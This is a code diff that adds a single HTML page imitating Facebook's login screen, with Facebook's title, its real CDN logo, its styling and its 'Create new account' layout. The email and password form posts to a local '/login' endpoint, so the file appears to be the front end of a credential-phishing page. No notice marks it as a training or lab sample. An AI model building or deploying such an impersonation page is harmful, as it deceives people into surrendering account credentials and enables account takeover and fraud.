@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+        }
+
+        .main-container {
+            width: 980px;
+            margin-top: 92px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* Left Side */
+        .left-content {
+            width: 580px;
+            padding-top: 112px;
+            padding-right: 32px;
+        }
+
+        .left-content img {
+            height: 106px;
+            margin: -28px;
+        }
+
+        .left-content h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            color: #1c1e21;
+        }
+
+        /* Right Side / Login Card */
+        .right-content {
+            width: 396px;
+        }
+
+        .login-card {
+            background-color: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        input {
+            width: 100%;
+            height: 52px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 48px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+
+        .forgot-pw {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .forgot-pw:hover { text-decoration: underline; }
+
+        hr {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin-bottom: 20px;
+        }
+
+        .create-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            padding: 0 16px;
+            line-height: 48px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .create-btn:hover { background-color: #36a420; }
+
+        .create-page {
+            margin-top: 28px;
+            font-size: 14px;
+        }
+
+        .create-page a {
+            text-decoration: none;
+            font-weight: 600;
+            color: #1c1e21;
+        }
+
+        .create-page a:hover { text-decoration: underline; }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .main-container { flex-direction: column; align-items: center; width: 100%; margin-top: 20px; }
+            .left-content { text-align: center; width: 100%; padding: 20px; }
+            .left-content h2 { width: 100%; font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="left-content">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lO_V_9WvCO.svg" alt="Facebook">
+            <h2>Facebook helps you connect and share with the people in your life.</h2>
+        </div>
+
+        <div class="right-content">
+            <div class="login-card">
+                <form action="/login" method="POST">
+                    <input type="text" name="username" placeholder="Email address or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                    <a href="#" class="forgot-pw">Forgotten password?</a>
+                    <hr>
+                    <button type="button" class="create-btn">Create new account</button>
+                </form>
+            </div>
+            <div class="create-page">
+                <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
